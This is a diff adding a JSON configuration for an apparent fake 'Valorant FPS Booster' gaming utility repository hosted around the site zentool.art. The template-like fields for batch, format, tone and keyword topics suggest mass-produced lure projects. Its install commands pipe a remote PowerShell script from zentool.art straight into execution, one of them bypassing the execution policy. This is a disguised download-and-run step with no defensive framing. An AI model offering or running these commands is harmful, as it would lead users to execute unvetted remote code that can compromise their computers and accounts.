@@ -1,0 +1,28 @@
+{
+  "repo": "Valorant-FPS-Booster",
+  "product": "Valorant FPS Booster",
+  "product_title": "Valorant FPS Booster",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "gaming",
+  "topics": [
+    "valorant-fps-booster-windows",
+    "valorant-config",
+    "valorant-integration",
+    "valorant-latest",
+    "gaming-performance",
+    "fps-tuning",
+    "windows-gaming",
+    "latency",
+    "game-client",
+    "performance-optimization",
+    "frame-timing",
+    "pc-gaming"
+  ],
+  "site": "zentool.art"
+}
